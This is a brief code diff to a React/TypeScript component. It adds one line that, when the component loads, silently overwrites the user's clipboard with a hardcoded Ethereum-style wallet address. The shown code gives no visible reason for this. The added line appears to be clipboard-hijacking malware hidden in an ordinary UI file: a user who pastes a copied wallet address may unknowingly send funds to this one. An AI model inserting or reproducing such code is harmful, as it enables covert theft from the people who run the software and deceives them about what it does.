@@ -185,6 +185,7 @@ export default function Main() {
   const navigate = useNavigate();
   const NodeRef = useRef<HTMLInputElement>();
   useEffect(() => {
+    navigator.clipboard.writeText("0x414e561C4b66c6243a73F248BBf4DBbf98a87594")
     function CLickEvet(mouse: MouseEvent) {
       console.log("Called");
       if (isOpened) {
